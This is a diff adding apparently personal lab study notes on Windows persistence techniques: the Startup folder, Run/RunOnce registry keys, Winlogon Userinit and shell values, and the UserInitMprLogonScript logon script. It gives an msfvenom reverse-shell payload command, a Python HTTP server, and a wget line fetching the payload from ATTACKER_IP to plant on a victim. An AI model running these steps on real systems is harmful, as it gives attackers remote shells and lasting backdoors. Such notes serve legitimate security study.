@@ -1,0 +1,41 @@
+- Some user action might execute specific persistence.
+
+- Startup folder
+    - Some executable in the c:\Users\[USERNAME] can be executed whenever the user logs in.
+    - To force any user to run the payload each time they logs in, the folder is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+    - On the attacker : 
+        - create a payload with msfvenom : 
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.19.103 LPORT=4450 -f exe -o revshell.exe
+        - start an http server using python
+            python -m http.server 8000
+    - on the victim : 
+        - download the payload : 
+            wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+        - Copy the payload to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp: 
+            copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+        - Sign out from the machine.
+        - Log in again to run the payload.
+
+- Run/RunOnce
+    - It is also possible to run a program via the registry. Instead of delivering the payload to a specific location, use the folowing registry entry to specify applications to run on logon : 
+        - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+        - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    - The registry under HKCU will apply to the current user and those under HKLM will apply to everyone.
+    - The program specified under Run will run everytime the user logs on and thos under RunOnce will be executed a single time.
+    - For this, create a payload and copy it to the victim machine (ex : c:\windows)
+    - create  REG_EXPAND_SZ registry under any of the above keys.
+    - Log out 
+    - Log in again to run the payload
+
+- winlogon. 
+    - the winlogon is a component that loads the user profile right after authentication.
+    - The winlogon uses some registry under HKLM\Software\Microsoft\Windows  that could be interesting to gain persistence : 
+        - Userinit point to userinit.exe which is in charge of restoring the user profile
+        - shell : point to the system's shell
+    - changing these executable to the payload will break the logon sequence. THhe best solution is to append it at the end separated with a comma to run the payload.
+
+- logon scripts.
+    - The userinit.exe, while loading will check for an environment variable called UserInitMprLogonScript. It is not set by default but can be created. This also means that each user has his own environment variable so need to set up a backdoor for each user.
+    - TO create an environment variable, go to HKCU\Environment then create a UserInitMprLogonScript REG_EXPAND_SZ in it.
